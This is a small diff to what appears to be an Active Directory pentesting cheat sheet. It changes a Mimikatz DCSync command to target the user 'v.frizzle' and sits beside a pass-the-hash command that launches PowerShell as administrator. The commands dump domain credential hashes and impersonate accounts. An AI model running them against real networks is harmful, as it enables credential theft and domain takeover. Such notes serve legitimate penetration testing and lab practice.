@@ -119,7 +119,7 @@ Get-ObjectACL "DC=pentesting,DC=local" -ResolveGUIDs | ? { ($_.SecurityIdentifie
 
 # dump the commands for administrator
 import-module invoke-mimikatz
-invoke-mimikatz -Command '"lsadump::dcsync /user:pentesting\administrator"'
+invoke-mimikatz -Command '"lsadump::dcsync /user:v.frizzle\administrator"'
 
 # pass the hash to become the administrator
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:... /ntlm:... /run:powershell.exe"'
